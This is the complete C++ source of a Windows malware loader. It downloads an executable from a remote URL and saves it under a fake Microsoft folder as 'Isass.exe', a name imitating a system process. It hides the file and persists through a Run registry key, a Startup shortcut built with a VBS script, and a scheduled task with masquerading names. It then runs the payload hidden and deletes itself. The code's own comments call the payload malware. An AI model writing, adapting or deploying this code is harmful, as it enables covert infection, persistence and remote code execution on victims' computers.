#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <direct.h>
#include <Wininet.h>
#pragma comment (lib, "urlmon.lib")
#pragma comment (lib, "Wininet.lib")

using namespace std;

void Install()
{
	try {
		// check internet connection status
		if (!InternetCheckConnection(L"https://ya.ru", FLAG_ICC_FORCE_CONNECTION, 0))
		{
			Sleep(60000);// sleep 1 minute
			Install();
			return;
		}

		// create dirs
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData", NULL);

		//fake dirs
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\DRM", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\platforms", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows NT", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search\\Data", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Vault", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Temp", NULL);

		// download discordia
		URLDownloadToFile(0, L"https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe", L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", 0, 0);

		// update file attributes
		BOOL result = SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", FILE_ATTRIBUTE_HIDDEN);

		// update dirs attributes
		system("attrib \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\" +h");

		// add to autoload part 1
		system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Local Security Authority Process\" /t REG_SZ /F /D \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\"");

		// add to autoload part 2
		system("echo Set oWS = WScript.CreateObject(\"WScript.Shell\") > CreateShortcut.vbs");
		system("echo sLinkFile = \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemHost.lnk\" >> CreateShortcut.vbs");
		system("echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs");
		system("echo oLink.TargetPath = \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\" >> CreateShortcut.vbs");
		system("echo oLink.Save >> CreateShortcut.vbs");
		system("cscript CreateShortcut.vbs");
		system("del CreateShortcut.vbs");

		// add to autoload part 3
		system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /MO 5 /TN \"Windows_Antimalware_System_Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");

		// starting malware
		ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe"), 0, 0, SW_HIDE);
	}
	catch (...)
	{
		Install();
		return;
	}
}

int main()
{
	// hide console
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);

	try
	{
		Install();
	}
	catch (...)
	{
		Install();
	}

	// suicide loader
	char current_work_dir[FILENAME_MAX];
	_getcwd(current_work_dir, sizeof(current_work_dir));
	string path = "taskkill /im Loader.exe /f & sleep 1000 & erase " + (string)current_work_dir + "\\Loader.exe & sleep 1000 & exit";
	system(path.c_str());

    return 0;
}